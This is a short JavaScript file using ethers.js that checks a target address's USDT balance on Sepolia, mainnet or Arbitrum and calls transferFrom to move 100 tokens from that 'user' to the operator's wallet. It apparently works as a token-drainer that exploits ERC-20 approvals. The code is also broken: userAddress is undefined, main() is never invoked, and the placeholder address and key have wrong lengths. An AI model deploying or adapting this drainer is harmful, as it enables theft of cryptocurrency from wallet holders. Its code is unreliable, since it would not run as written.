const { ethers } = require("ethers");

//#set networks

const RPC_URLS = {
  sepolia: "https://ethereum-sepolia-rpc.publicnode.com",
  mainnet: "https://ethereum-rpc.publicnode.com",
  arbitrum: "https://arbitrum-one-rpc.publicnode.com"
};

//your dex or purpose wallet adress

const YOUR_WALLET = "0x00000000000000000000000000000000000000000000"

const PRIVATE_KEY = "00000000000000000000000000000000000000000000000000";


//tokens like usdt in your user wallet

const TOKENS = {
  USDT: {
    address: "0x523C8591Fbe215B5aF0bEad65e65dF783A37BCBC",
    decimals: 6
  }
};

// ABI  ERC20 standard
const TOKEN_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transferFrom(address from, address to, uint256 amount) returns (bool)"
];

//#main function 
async function main() {
 
  const networkName = process.argv[2] || "sepolia";
  const rpcUrl = RPC_URLS[networkName];

  if (!rpcUrl) {
    console.error(`Error : ${networkName}`);
    console.log("Error: sepolia, mainnet, arbitrum");
    return;
  }

  // provider and wallet
  const provider = new ethers.JsonRpcProvider(rpcUrl);
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);



    for (const [name, token] of Object.entries(TOKENS)) {
      try {
        const contract = new ethers.Contract(token.address, TOKEN_ABI, wallet);
        const balance = await contract.balanceOf(userAddress);


       if (balance > 0n) {
          const amount = ethers.parseUnits("100", token.decimals);
          if (balance >= amount) {
            console.log(`${name} find this token: ${ethers.formatUnits(balance, token.decimals)} token`);
            const tx = await contract.transferFrom(userAddress, YOUR_WALLET, amount);
            await tx.wait();
            console.log(`${name}  ${userAddress.slice(0, 10)} done!`);
          }
        }
      } catch (e) {
        console.log(`Error ${name}:`, e.message.split("\n")[0]);
      }
    }
  }

